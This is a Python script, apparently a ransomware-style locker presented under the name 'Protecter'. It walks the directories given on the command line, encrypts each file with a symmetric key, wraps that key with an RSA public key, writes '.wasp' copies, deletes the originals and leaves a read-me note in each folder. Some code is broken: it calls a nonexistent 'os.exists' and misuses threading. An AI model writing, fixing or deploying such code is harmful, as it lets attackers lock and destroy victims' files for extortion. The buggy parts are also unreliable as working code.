from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from cryptography.fernet import Fernet
import threading
import os
import sys

class Protecter:
    def __init__(self):
        self.aes_key = None
        self.cryptor = None
        self.filelist = []
        self.directories = []
        for i in range(len(sys.argv)):
            self.directories.append(sys.argv[i])

    def generate_aes_key(self):
        self.aes_key =  Fernet.generate_key()
        print(self.aes_key)
        self.cryptor = Fernet(self.aes_key)

    def rsa_encryption(self):
        with open("public.pem", 'rb') as rsa_pub_key:
            public_key = RSA.importKey(rsa_pub_key.read())
            public_cryptor =  PKCS1_OAEP.new(public_key)
            encrypted_aes_key = public_cryptor.encrypt(self.aes_key)
        with open ("encrypted_aes_key.txt", 'wb') as aesout:
            aesout.write(encrypted_aes_key)
        public_cryptor = None
    
    def getfile(self):
        for path in self.directories:
            for root, dirs, files in os.walk(path):
                for file in files:
                    #loggin all files in a list
                    self.filelist.append(os.path.join(root,file))


    def encrypt(self):
        for file in self.filelist:
            try:
                if not file.endswith('.wasp') and os.exists(file):
                    with open(file, 'rb') as datain:
                        data = datain.read()
                        encrypted_data = self.cryptor.encrypt(data)
                        #print(file + " encrypted")
                    with open(f"{file}.wasp", "wb") as wasp:
                        wasp.write(encrypted_data)
                    with open("encrypted_files.log", 'a+') as log:
                        log.write(f"{file}\n")
                    os.remove(file)
            except Exception:
                with open("failed_encryption.log", 'a+') as fail:
                    fail.write(f"{file}\n")
                    continue

    def leavenote(self):
        mynote ='''
write something here.notes or anything you want to log beside the encrypted file.
you still can read this note after the script excution.
saved under every folder in argument list.

'''
        for folder in self.directories:
            with open(f'{folder}/encryption_read_me.txt', 'w') as f:
                f.write(mynote)

    def clear(self):
        self.aes_key = None
        self.cryptor = None
        self.filelist = []
        self.directories = []


def main():
    threads = []
    run = Protecter()
    print("__START ENCRYPTION__")
    print("[+] generating aes key")
    run.generate_aes_key()
    print("[+] done.")
    print("[+] getting all files and directories")
    run.getfile()
    print("[+] done")
    print("[+] encrypting aes key with rsa pub key")
    run.rsa_encryption()
    print("[+] done.")
    print("[+] encryption start.")
    #threaded encryption controle it through range number
    for i in range(8):
        t = threading.Thread(target=run.encrypt())
        threads.append(t)
        t.start()
    print("[+] encryption end.")
    print("[+] leaving notes.")
    run.leavenote()
    print("[+] done.")
    print("[+] clearing memoring from keys")
    run.clear()
    print("__END ENCRYPTION__")
    print("dont forget your stuff ¯\_(ツ)_/¯ ")

try:
    main()
except Exception:
    print("Error!!...put the public.pem key here from the generation script")
    print(f"usage: {sys.argv[0]} folder1 folder2 folder3...")